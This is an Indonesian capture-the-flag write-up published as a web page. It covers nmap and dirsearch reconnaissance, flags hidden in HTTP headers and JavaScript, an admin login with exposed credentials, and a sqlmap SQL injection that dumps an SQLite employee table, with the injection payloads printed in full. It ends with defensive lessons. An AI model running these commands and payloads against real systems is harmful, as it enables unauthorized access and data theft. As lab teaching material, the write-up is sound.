@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚠️ | CTF Yadika</title>
+    
+    <meta name="description" content="Writeup CTF Yadika">
+    <link rel="canonical" href="https://paperalt.github.io/writeups/CTF_Yadika.html">
+    
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://paperalt.github.io/writeups/CTF_Yadika.html">
+    <meta property="og:title" content="CTF Yadika">
+    <meta property="og:description" content="Writeup CTF Yadika">
+    <meta property="og:image" content="https://paperalt.github.io//assets/img/screenshot/Pasted_image_20260306165147.png">
+    
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://paperalt.github.io/writeups/CTF_Yadika.html">
+    <meta property="twitter:title" content="CTF Yadika">
+    <meta property="twitter:description" content="Writeup CTF Yadika">
+    <meta property="twitter:image" content="https://paperalt.github.io//assets/img/screenshot/Pasted_image_20260306165147.png">
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="../favicon/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="../favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="../favicon/favicon-16x16.png">
+    <link rel="manifest" href="../favicon/site.webmanifest">
+    <!-- Stylesheet: Pointing to assets/css/style.css from templates/ directory -->
+    <link rel="stylesheet" href="../assets/css/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+</head>
+
+<body>
+    <canvas id="matrix-bg"></canvas>
+    <div class="scanline"></div>
+
+    <nav class="navbar">
+        <div class="logo"><a href="../index.html">.. / BACK_TO_ROOT</a></div>
+    </nav>
+
+    <main class="container">
+        <article class="writeup-content">
+            <header>
+                <h1>CTF Yadika</h1>
+                <div class="writeup-meta">
+                    <div class="meta-item">
+                        <span class="meta-label">DATE:</span>
+                        <span class="meta-value">2026-03-06</span>
+                    </div>
+                    <div class="meta-item">
+                        <span class="meta-label">AUTHOR:</span>
+                        <span class="meta-value">Alterpix</span>
+                    </div>
+                    <div class="meta-item">
+                        <span class="meta-label">CATEGORY:</span>
+                        <span class="meta-value">Writeup</span>
+                    </div>
+                </div>
+            </header>
+
+            <div class="writeup-body">
+                
+        <div class="legal-warning">
+            <div class="warning-icon">⚠️ WARNING_</div>
+            <p>
+                <strong>DISCLAIMER:</strong> Materi ini dibuat semata-mata untuk tujuan <strong>EDUKASI</strong> dan keamanan siber.
+                Penulis tidak bertanggung jawab atas segala bentuk penyalahgunaan informasi yang ada di sini.
+                Menguji teknik ini pada sistem tanpa izin eksplisit adalah tindakan <strong>ILEGAL</strong>.
+            </p>
+        </div>
+        
+                <h2>Reconnaissance</h2>
+<p>Mulailah dengan scanning port menggunakan Nmap.</p>
+<div class="code-terminal">
+    <div class="terminal-header">
+        <div class="dot red"></div>
+        <div class="dot yellow"></div>
+        <div class="dot green"></div>
+        <div class="title">BASH_SHELL</div>
+    </div>
+    <div class="terminal-body"><div class="codehilite"><pre><span></span><code>nmap<span class="w"> </span>-T4<span class="w"> </span>&lt;target_ip&gt;
+
+Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.98<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2026</span>-03-06<span class="w"> </span><span class="m">16</span>:45<span class="w"> </span>+0700
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>&lt;target_ip&gt;.vultrusercontent.com<span class="w"> </span><span class="o">(</span>&lt;target_ip&gt;<span class="o">)</span>
+Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.026s<span class="w"> </span>latency<span class="o">)</span>.
+Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">997</span><span class="w"> </span>filtered<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>no-response<span class="o">)</span>
+PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE
+<span class="m">22</span>/tcp<span class="w">   </span>open<span class="w">  </span>ssh
+<span class="m">80</span>/tcp<span class="w">   </span>open<span class="w">  </span>http
+<span class="m">8090</span>/tcp<span class="w"> </span>open<span class="w">  </span>opsmessaging
+
+Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">4</span>.46<span class="w"> </span>seconds
+</code></pre></div></div>
+</div>
+
+<p>Terdapat port 8090 yang open dan port 80 adalah exclude target jadi saya skip.</p>
+<h2>Enumeration</h2>
+<h3>Port 8090 - HTTP</h3>
+<p><img alt="Pasted image 20260306165147.png" src="/assets/img/screenshot/Pasted_image_20260306165147.png" />
+Terdapat kode error 404 yang menunjukkan halaman tidak ada isinya.
+coba saya lakukan directory bruteforce.</p>
+<h3>Directory bruteforce</h3>
+<div class="code-terminal">
+    <div class="terminal-header">
+        <div class="dot red"></div>
+        <div class="dot yellow"></div>
+        <div class="dot green"></div>
+        <div class="title">TERMINAL</div>
+    </div>
+    <div class="terminal-body"><div class="codehilite"><pre><span></span><code>dirsearch<span class="w"> </span>-u<span class="w"> </span>http://&lt;target_ip&gt;:8090/
+
+
+<span class="w">  </span>_<span class="p">|</span>.<span class="w"> </span>_<span class="w"> </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w"> </span>_<span class="p">|</span>_<span class="w">    </span>v0.4.3.post1
+<span class="w"> </span><span class="o">(</span>_<span class="o">||</span><span class="p">|</span><span class="w"> </span>_<span class="o">)</span><span class="w"> </span><span class="o">(</span>/_<span class="o">(</span>_<span class="o">||</span><span class="w"> </span><span class="o">(</span>_<span class="p">|</span><span class="w"> </span><span class="o">)</span>
+
+Extensions:<span class="w"> </span>php,<span class="w"> </span>aspx,<span class="w"> </span>jsp,<span class="w"> </span>html,<span class="w"> </span>js<span class="w"> </span><span class="p">|</span><span class="w"> </span>HTTP<span class="w"> </span>method:<span class="w"> </span>GET<span class="w"> </span><span class="p">|</span><span class="w"> </span>Threads:<span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Wordlist<span class="w"> </span>size:<span class="w"> </span><span class="m">11460</span>
+
+Output<span class="w"> </span>File:<span class="w"> </span>/home/alterpix/reports/http_&lt;target_ip&gt;_8090/__26-03-06_16-58-26.txt
+
+Target:<span class="w"> </span>http://&lt;target_ip&gt;:8090/
+
+<span class="o">[</span><span class="m">16</span>:58:26<span class="o">]</span><span class="w"> </span>Starting:<span class="w"> </span>
+<span class="o">[</span><span class="m">16</span>:58:29<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>320B<span class="w">  </span>-<span class="w"> </span>/.ht_wsr.txt<span class="w">                                      </span>
+<span class="o">[</span><span class="m">16</span>:58:29<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>320B<span class="w">  </span>-<span class="w"> </span>/.htaccess.orig<span class="w">                                   </span>
+<span class="o">[</span><span class="m">16</span>:58:29<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>320B<span class="w">  </span>-<span class="w"> </span>/.htaccess.bak1
+<span class="o">[</span><span class="m">16</span>:58:29<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>320B<span class="w">  </span>-<span class="w"> </span>/.htaccess.sample
+<span class="o">[</span><span class="m">16</span>:58:29<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>320B<span class="w">  </span>-<span class="w"> </span>/.htaccess.save<span class="w">                                   </span>
+<span class="o">[</span><span class="m">16</span>:58:29<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>320B<span class="w">  </span>-<span class="w"> </span>/.htaccess_extra<span class="w">                                  </span>
+<span class="o">[</span><span class="m">16</span>:58:29<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>320B<span class="w">  </span>-<span class="w"> </span>/.htaccess_sc
+<span class="o">[</span><span class="m">16</span>:58:29<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>320B<span class="w">  </span>-<span class="w"> </span>/.htaccess_orig
+<span class="o">[</span><span class="m">16</span>:58:29<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>320B<span class="w">  </span>-<span class="w"> </span>/.htaccessOLD
+<span class="o">[</span><span class="m">16</span>:58:29<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>320B<span class="w">  </span>-<span class="w"> </span>/.htaccessBAK
+<span class="o">[</span><span class="m">16</span>:58:29<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>320B<span class="w">  </span>-<span class="w"> </span>/.htaccessOLD2<span class="w">                                    </span>
+<span class="o">[</span><span class="m">16</span>:58:29<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>320B<span class="w">  </span>-<span class="w"> </span>/.htm
+<span class="o">[</span><span class="m">16</span>:58:29<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>320B<span class="w">  </span>-<span class="w"> </span>/.html
+<span class="o">[</span><span class="m">16</span>:58:29<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>320B<span class="w">  </span>-<span class="w"> </span>/.htpasswd_test<span class="w">                                   </span>
+<span class="o">[</span><span class="m">16</span>:58:29<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>320B<span class="w">  </span>-<span class="w"> </span>/.htpasswds
+<span class="o">[</span><span class="m">16</span>:58:29<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>320B<span class="w">  </span>-<span class="w"> </span>/.httr-oauth
+<span class="o">[</span><span class="m">16</span>:58:41<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>359B<span class="w">  </span>-<span class="w"> </span><span class="o">[</span>REDACTED<span class="o">]</span><span class="w">        </span>
+<span class="o">[</span><span class="m">16</span>:58:41<span class="o">]</span><span class="w"> </span><span class="m">200</span><span class="w"> </span>-<span class="w">   </span>2KB<span class="w">  </span>-<span class="w"> </span><span class="o">[</span>REDACTED<span class="o">]</span><span class="w">                                             </span>
+<span class="o">[</span><span class="m">16</span>:58:53<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>320B<span class="w">  </span>-<span class="w"> </span>/server-status<span class="w">                                    </span>
+<span class="o">[</span><span class="m">16</span>:58:53<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>320B<span class="w">  </span>-<span class="w"> </span>/server-status/
+
+Task<span class="w"> </span>Completed
+</code></pre></div></div>
+</div>
+
+<p>Setelah saya lakukan directory brute force, saya menemukan 1 request yang menunjukkan respon 200 yang berarti halaman tersebut ada dan bisa di akses.</p>
+<p>Sekarang saya akan membuka halaman itu
+<img alt="Pasted image 20260306170310.png" src="/assets/img/screenshot/Pasted_image_20260306170310.png" /></p>
+<h3>Flag 1</h3>
+<p>Karena dari salah satu challenge menunjukkan kata header jadi saya mencoba melihat isi header dari directory url tersebut dan ternyata flag pertama ada disana.</p>
+<div class="code-terminal">
+    <div class="terminal-header">
+        <div class="dot red"></div>
+        <div class="dot yellow"></div>
+        <div class="dot green"></div>
+        <div class="title">TERMINAL</div>
+    </div>
+    <div class="terminal-body"><div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-I<span class="w"> </span>http://&lt;target_ip&gt;:8090/<span class="o">[</span>REDACTED<span class="o">]</span>/index.php
+
+HTTP/1.1<span class="w"> </span><span class="m">200</span><span class="w"> </span>OK
+Date:<span class="w"> </span>Fri,<span class="w"> </span><span class="m">06</span><span class="w"> </span>Mar<span class="w"> </span><span class="m">2026</span><span class="w"> </span><span class="m">10</span>:05:03<span class="w"> </span>GMT
+Server:<span class="w"> </span>Apache/2.4.66<span class="w"> </span><span class="o">(</span>Debian<span class="o">)</span>
+X-Powered-By:<span class="w"> </span>MBG-Portal/2.3.1
+X-Debug-Mode:<span class="w"> </span>enabled
+X-Flag:<span class="w"> </span>flag<span class="o">[</span>REDACTED<span class="o">]</span>
+Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>UTF-8
+</code></pre></div></div>
+</div>
+
+<h3>Flag 2</h3>
+<p>Pada flag kedua memberikan sebuah hint untuk memeriksa javascript.
+Disini saya melakukan inspect untuk melihat network request yang berkaitan dengan javascript.
+<img alt="Pasted image 20260306170953.png" src="/assets/img/screenshot/Pasted_image_20260306170953.png" /></p>
+<p>Terdapat Hint mencurigakan yang mengarah ke javascript lain
+<img alt="Pasted image 20260306172321.png" src="/assets/img/screenshot/Pasted_image_20260306172321.png" />
+Sekarang saya akan mengikuti konten javascript yang di mention itu.
+<img alt="Pasted image 20260306172616.png" src="/assets/img/screenshot/Pasted_image_20260306172616.png" />
+Flag ke 2 ternyata ada di javascript yang tadi saya ikuti.
+Di dalam javascript tadi terdapat informasi lain yang mengarah ke Directory Rahasia</p>
+<h3>Flag 3</h3>
+<p><img alt="Pasted image 20260306172844.png" src="/assets/img/screenshot/Pasted_image_20260306172844.png" />
+Pada directory rahasia tadi ternyata ada fitur directory listing yang membuat saya bisa melihat isi file lain juga secara terbuka.
+Saya mencoba melihat isi source page nya dengan view page source.
+<img alt="Pasted image 20260306174111.png" src="/assets/img/screenshot/Pasted_image_20260306174111.png" />
+Flag Ketiga ada disana dan termasuk juga directory admin, username dan password nya.</p>
+<h3>Flag 4</h3>
+<p>Sekarang saya mencoba melihat isi dari web login admin itu dan login dengan kredensial yang sebelumnya ditemukan.
+<img alt="Pasted image 20260306174441.png" src="/assets/img/screenshot/Pasted_image_20260306174441.png" /></p>
+<p>Ternyata kredensial itu valid dan berhasil login sebagai admin MBG.
+<img alt="Pasted image 20260306174611.png" src="/assets/img/screenshot/Pasted_image_20260306174611.png" />
+Selanjutnya saya akan mencari apakah ada kerentanan di dalam Dashboard ini atau ada konten menarik lain.</p>
+<p>Ternyata terdapat kerentanan SQL injection pada sistem pencarian di menu pegawai, dengan saya mencoba mengisi inputan menggunankan ' lalu terjadi error.
+<img alt="Pasted image 20260306174835.png" src="/assets/img/screenshot/Pasted_image_20260306174835.png" /></p>
+<h2>Vulnerability Analysis</h2>
+<p>Kerentanan itu adalah SQL Injection karena gagal sanitasi pada sistem pencarian, karena saya memerlukan login untuk bisa mengakses halaman itu. Langkah selanjutnya adalah mengambil session Cookie yang akan saya gunakan dengan sqlmap
+<img alt="Pasted image 20260306175117.png" src="/assets/img/screenshot/Pasted_image_20260306175117.png" /></p>
+<h2>Exploitation</h2>
+<p>Karena database nya SQLite jadi saya menggunakan --tables karena dia hanya database tunggal</p>
+<div class="code-terminal">
+    <div class="terminal-header">
+        <div class="dot red"></div>
+        <div class="dot yellow"></div>
+        <div class="dot green"></div>
+        <div class="title">TERMINAL</div>
+    </div>
+    <div class="terminal-body"><div class="codehilite"><pre><span></span><code>sqlmap<span class="w"> </span>--cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=[REDACTED]&quot;</span><span class="w"> </span>-u<span class="w"> </span>http://&lt;target_ip&gt;:8090/dev/<span class="o">[</span>REDACTED<span class="o">]</span>/pegawai.php?cari<span class="o">=</span>admin<span class="w"> </span>--tables<span class="w"> </span>--dump
+<span class="w">        </span>___
+<span class="w">       </span>__H__
+<span class="w"> </span>___<span class="w"> </span>___<span class="o">[(]</span>_____<span class="w"> </span>___<span class="w"> </span>___<span class="w">  </span><span class="o">{</span><span class="m">1</span>.10#stable<span class="o">}</span><span class="w">                                          </span>
+<span class="p">|</span>_<span class="w"> </span>-<span class="p">|</span><span class="w"> </span>.<span class="w"> </span><span class="o">[</span>,<span class="o">]</span><span class="w">     </span><span class="p">|</span><span class="w"> </span>.<span class="s1">&#39;| . |</span>
+<span class="s1">|___|_  [&quot;]_|_|_|__,|  _|</span>
+<span class="s1">      |_|V...       |_|   https://sqlmap.org                                                                                                                         </span>
+<span class="s1">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s<span class="w"> </span>responsibility<span class="w"> </span>to<span class="w"> </span>obey<span class="w"> </span>all<span class="w"> </span>applicable<span class="w"> </span>local,<span class="w"> </span>state<span class="w"> </span>and<span class="w"> </span>federal<span class="w"> </span>laws.<span class="w"> </span>Developers<span class="w"> </span>assume<span class="w"> </span>no<span class="w"> </span>liability<span class="w"> </span>and<span class="w"> </span>are<span class="w"> </span>not<span class="w"> </span>responsible<span class="w"> </span><span class="k">for</span><span class="w"> </span>any<span class="w"> </span>misuse<span class="w"> </span>or<span class="w"> </span>damage<span class="w"> </span>caused<span class="w"> </span>by<span class="w"> </span>this<span class="w"> </span>program
+
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>starting<span class="w"> </span>@<span class="w"> </span><span class="m">17</span>:56:52<span class="w"> </span>/2026-03-06/
+
+<span class="o">[</span><span class="m">17</span>:56:52<span class="o">]</span><span class="w"> </span><span class="o">[</span>INFO<span class="o">]</span><span class="w"> </span>resuming<span class="w"> </span>back-end<span class="w"> </span>DBMS<span class="w"> </span><span class="s1">&#39;sqlite&#39;</span><span class="w"> </span>
+<span class="o">[</span><span class="m">17</span>:56:52<span class="o">]</span><span class="w"> </span><span class="o">[</span>INFO<span class="o">]</span><span class="w"> </span>testing<span class="w"> </span>connection<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>target<span class="w"> </span>URL
+sqlmap<span class="w"> </span>resumed<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>injection<span class="w"> </span>point<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>from<span class="w"> </span>stored<span class="w"> </span>session:
+---
+Parameter:<span class="w"> </span>cari<span class="w"> </span><span class="o">(</span>GET<span class="o">)</span>
+<span class="w">    </span>Type:<span class="w"> </span>boolean-based<span class="w"> </span>blind
+<span class="w">    </span>Title:<span class="w"> </span>SQLite<span class="w"> </span>AND<span class="w"> </span>boolean-based<span class="w"> </span>blind<span class="w"> </span>-<span class="w"> </span>WHERE,<span class="w"> </span>HAVING,<span class="w"> </span>GROUP<span class="w"> </span>BY<span class="w"> </span>or<span class="w"> </span>HAVING<span class="w"> </span>clause<span class="w"> </span><span class="o">(</span>JSON<span class="o">)</span>
+<span class="w">    </span>Payload:<span class="w"> </span><span class="nv">cari</span><span class="o">=</span><span class="m">1</span><span class="s1">&#39; AND CASE WHEN 6350=6350 THEN 6350 ELSE JSON(CHAR(105,107,80,71)) END-- kAnq</span>
+
+<span class="s1">    Type: UNION query</span>
+<span class="s1">    Title: Generic UNION query (NULL) - 4 columns</span>
+<span class="s1">    Payload: cari=1&#39;</span><span class="w"> </span>UNION<span class="w"> </span>ALL<span class="w"> </span>SELECT<span class="w"> </span>NULL,NULL,CHAR<span class="o">(</span><span class="m">113</span>,113,112,113,113<span class="o">)||</span>CHAR<span class="o">(</span><span class="m">82</span>,113,83,117,109,120,116,98,101,75,65,113,120,87,112,87,84,117,122,86,118,85,108,65,72,83,112,113,82,117,112,121,105,117,87,76,80,121,79,120<span class="o">)||</span>CHAR<span class="o">(</span><span class="m">113</span>,106,106,98,113<span class="o">)</span>,NULL--<span class="w"> </span>dpWK
+---
+<span class="o">[</span><span class="m">17</span>:56:53<span class="o">]</span><span class="w"> </span><span class="o">[</span>INFO<span class="o">]</span><span class="w"> </span>the<span class="w"> </span>back-end<span class="w"> </span>DBMS<span class="w"> </span>is<span class="w"> </span>SQLite
+web<span class="w"> </span>server<span class="w"> </span>operating<span class="w"> </span>system:<span class="w"> </span>Linux<span class="w"> </span>Debian
+web<span class="w"> </span>application<span class="w"> </span>technology:<span class="w"> </span>Apache<span class="w"> </span><span class="m">2</span>.4.66,<span class="w"> </span>PHP<span class="w"> </span><span class="m">8</span>.2.30
+back-end<span class="w"> </span>DBMS:<span class="w"> </span>SQLite
+<span class="o">[</span><span class="m">17</span>:56:53<span class="o">]</span><span class="w"> </span><span class="o">[</span>INFO<span class="o">]</span><span class="w"> </span>fetching<span class="w"> </span>tables<span class="w"> </span><span class="k">for</span><span class="w"> </span>database:<span class="w"> </span><span class="s1">&#39;SQLite_masterdb&#39;</span>
+&lt;current&gt;
+<span class="o">[</span><span class="m">2</span><span class="w"> </span>tables<span class="o">]</span>
++---------+
+<span class="p">|</span><span class="w"> </span>flags<span class="w">   </span><span class="p">|</span>
+<span class="p">|</span><span class="w"> </span>pegawai<span class="w"> </span><span class="p">|</span>
++---------+
+
+<span class="o">[</span><span class="m">17</span>:56:53<span class="o">]</span><span class="w"> </span><span class="o">[</span>INFO<span class="o">]</span><span class="w"> </span>fetching<span class="w"> </span>columns<span class="w"> </span><span class="k">for</span><span class="w"> </span>table<span class="w"> </span><span class="s1">&#39;pegawai&#39;</span><span class="w"> </span>
+<span class="o">[</span><span class="m">17</span>:56:53<span class="o">]</span><span class="w"> </span><span class="o">[</span>WARNING<span class="o">]</span><span class="w"> </span>reflective<span class="w"> </span>value<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>found<span class="w"> </span>and<span class="w"> </span>filtering<span class="w"> </span>out
+<span class="o">[</span><span class="m">17</span>:56:53<span class="o">]</span><span class="w"> </span><span class="o">[</span>INFO<span class="o">]</span><span class="w"> </span>fetching<span class="w"> </span>entries<span class="w"> </span><span class="k">for</span><span class="w"> </span>table<span class="w"> </span><span class="s1">&#39;pegawai&#39;</span>
+Database:<span class="w"> </span>&lt;current&gt;
+Table:<span class="w"> </span>pegawai
+<span class="o">[</span><span class="m">5</span><span class="w"> </span>entries<span class="o">]</span>
++----+-----------------+----------------+-------------+
+<span class="p">|</span><span class="w"> </span>id<span class="w"> </span><span class="p">|</span><span class="w"> </span>nama<span class="w">            </span><span class="p">|</span><span class="w"> </span>email<span class="w">          </span><span class="p">|</span><span class="w"> </span>divisi<span class="w">      </span><span class="p">|</span>
++----+-----------------+----------------+-------------+
+<span class="p">|</span><span class="w"> </span><span class="m">1</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>Prabowo<span class="w"> </span>Santoso<span class="w"> </span><span class="p">|</span><span class="w"> </span>prabowo@mbg.id<span class="w"> </span><span class="p">|</span><span class="w"> </span>Engineering<span class="w"> </span><span class="p">|</span>
+<span class="p">|</span><span class="w"> </span><span class="m">2</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>Jokowi<span class="w"> </span>Raharjo<span class="w">  </span><span class="p">|</span><span class="w"> </span>jokowi@mbg.id<span class="w">  </span><span class="p">|</span><span class="w"> </span>HR<span class="w">          </span><span class="p">|</span>
+<span class="p">|</span><span class="w"> </span><span class="m">3</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>Gibran<span class="w"> </span>Dewi<span class="w">     </span><span class="p">|</span><span class="w"> </span>gibran@mbg.id<span class="w">  </span><span class="p">|</span><span class="w"> </span>Keuangan<span class="w">    </span><span class="p">|</span>
+<span class="p">|</span><span class="w"> </span><span class="m">4</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>Bahlil<span class="w"> </span>Kusuma<span class="w">   </span><span class="p">|</span><span class="w"> </span>bahlil@mbg.id<span class="w">  </span><span class="p">|</span><span class="w"> </span>Logistik<span class="w">    </span><span class="p">|</span>
+<span class="p">|</span><span class="w"> </span><span class="m">5</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>Eka<span class="w"> </span>Wijaya<span class="w">      </span><span class="p">|</span><span class="w"> </span>eka@mbg.id<span class="w">     </span><span class="p">|</span><span class="w"> </span>IT<span class="w"> </span>Security<span class="w"> </span><span class="p">|</span>
++----+-----------------+----------------+-------------+
+
+<span class="o">[</span><span class="m">17</span>:56:53<span class="o">]</span><span class="w"> </span><span class="o">[</span>INFO<span class="o">]</span><span class="w"> </span>table<span class="w"> </span><span class="s1">&#39;SQLite_masterdb.pegawai&#39;</span><span class="w"> </span>dumped<span class="w"> </span>to<span class="w"> </span>CSV<span class="w"> </span>file<span class="w"> </span><span class="s1">&#39;/home/alterpix/.local/share/sqlmap/output/&lt;target_ip&gt;/dump/SQLite_masterdb/pegawai.csv&#39;</span>
+<span class="o">[</span><span class="m">17</span>:56:53<span class="o">]</span><span class="w"> </span><span class="o">[</span>INFO<span class="o">]</span><span class="w"> </span>fetching<span class="w"> </span>columns<span class="w"> </span><span class="k">for</span><span class="w"> </span>table<span class="w"> </span><span class="s1">&#39;flags&#39;</span><span class="w"> </span>
+<span class="o">[</span><span class="m">17</span>:56:53<span class="o">]</span><span class="w"> </span><span class="o">[</span>INFO<span class="o">]</span><span class="w"> </span>fetching<span class="w"> </span>entries<span class="w"> </span><span class="k">for</span><span class="w"> </span>table<span class="w"> </span><span class="s1">&#39;flags&#39;</span>
+Database:<span class="w"> </span>&lt;current&gt;
+Table:<span class="w"> </span>flags
+<span class="o">[</span><span class="m">1</span><span class="w"> </span>entry<span class="o">]</span>
++----+----------+-------------------------------+
+<span class="p">|</span><span class="w"> </span>id<span class="w"> </span><span class="p">|</span><span class="w"> </span>nama<span class="w">     </span><span class="p">|</span><span class="w"> </span>nilai<span class="w">                         </span><span class="p">|</span>
++----+----------+-------------------------------+
+<span class="p">|</span><span class="w"> </span><span class="m">1</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>ch5_flag<span class="w"> </span><span class="p">|</span><span class="w"> </span>flag<span class="o">[</span>REDACTED<span class="o">]</span><span class="w">                </span><span class="p">|</span>
++----+----------+-------------------------------+
+
+<span class="o">[</span><span class="m">17</span>:56:53<span class="o">]</span><span class="w"> </span><span class="o">[</span>INFO<span class="o">]</span><span class="w"> </span>table<span class="w"> </span><span class="s1">&#39;SQLite_masterdb.flags&#39;</span><span class="w"> </span>dumped<span class="w"> </span>to<span class="w"> </span>CSV<span class="w"> </span>file<span class="w"> </span><span class="s1">&#39;/home/alterpix/.local/share/sqlmap/output/&lt;ip_target&gt;/dump/SQLite_masterdb/flags.csv&#39;</span>
+<span class="o">[</span><span class="m">17</span>:56:53<span class="o">]</span><span class="w"> </span><span class="o">[</span>INFO<span class="o">]</span><span class="w"> </span>fetched<span class="w"> </span>data<span class="w"> </span>logged<span class="w"> </span>to<span class="w"> </span>text<span class="w"> </span>files<span class="w"> </span>under<span class="w"> </span><span class="s1">&#39;/home/alterpix/.local/share/sqlmap/output/&lt;ip_target&gt;&#39;</span>
+
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>ending<span class="w"> </span>@<span class="w"> </span><span class="m">17</span>:56:53<span class="w"> </span>/2026-03-06/
+</code></pre></div></div>
+</div>
+
+<p>Flag ke empat ditemukan di tabel flag.</p>
+<h2>Lessons Learned</h2>
+<ol>
+<li><strong>Nonaktifkan Directory Listing</strong>: Pastikan fitur <em>directory listing</em> (misalnya <code>Options -Indexes</code> pada Apache) dinonaktifkan pada <em>web server</em>. Konfigurasi yang keliru dapat memungkinkan penyerang melihat isi direktori dan menemukan file, <em>source code</em>, atau kredensial sensitif yang seharusnya tersembunyi.</li>
+<li><strong>Jangan Simpan Kredensial di Source Code</strong>: Hindari praktik menaruh kredensial (<em>username</em> dan <em>password</em>) atau informasi rahasia lainnya di dalam <em>source code</em> atau file <em>client-side</em> (seperti HTML atau JavaScript) yang dapat diinspeksi dengan mudah oleh publik.</li>
+<li><strong>Mencegah SQL Injection</strong>: Kerentanan pada sistem pencarian membuktikan pentingnya validasi dan sanitasi data input. Selalu gunakan <em>Parameterized Queries</em> (<em>Prepared Statements</em>) alih-alih merangkai <em>query</em> SQL secara langsung dengan input dari pengguna untuk mencegah eksekusi <em>query</em> manipulatif.</li>
+<li><strong>Hindari Kebocoran Informasi di Header HTTP</strong>: Hindari mengekspos informasi rahasia seperti versi <em>stack</em> teknologi atau flag secara eksplisit melalui <em>HTTP Response Headers</em> kustom.</li>
+</ol>
+            </div>
+
+            <br>
+            <a href="../index.html" class="cyber-btn">
+                <span class="cyber-btn-glitch">END_SESSION</span>
+                <span class="cyber-btn-tag">EXIT</span>
+            </a>
+        </article>
+    </main>
+
+    <script src="../assets/js/main.js"></script>
+    <script src="../assets/js/L2Dwidget.min.js"></script>
+
+    <!-- Live2D Debug Panel -->
+    <div id="l2d-debug-panel"
+        style="display: none; position: fixed; bottom: 20px; left: 20px; background: rgba(0,0,0,0.8); border: 1px solid #0f0; padding: 15px; border-radius: 5px; z-index: 9999; color: #0f0; font-family: 'Share Tech Mono', monospace; max-width: 300px;">
+        <h3 style="margin-top: 0; color: #fff; text-shadow: 0 0 5px #0f0;">L2D Debug</h3>
+        <label for="texture-select" style="display: block; margin-bottom: 5px;">Select Texture:</label>
+        <select id="texture-select"
+            style="width: 100%; background: #000; color: #0f0; border: 1px solid #0f0; padding: 5px; margin-bottom: 10px;">
+            <option value="">Loading...</option>
+        </select>
+        <button id="apply-texture"
+            style="width: 100%; background: #0f0; color: #000; border: none; padding: 8px; font-weight: bold; cursor: pointer;">APPLY
+            TEXTURE</button>
+        <button id="close-debug"
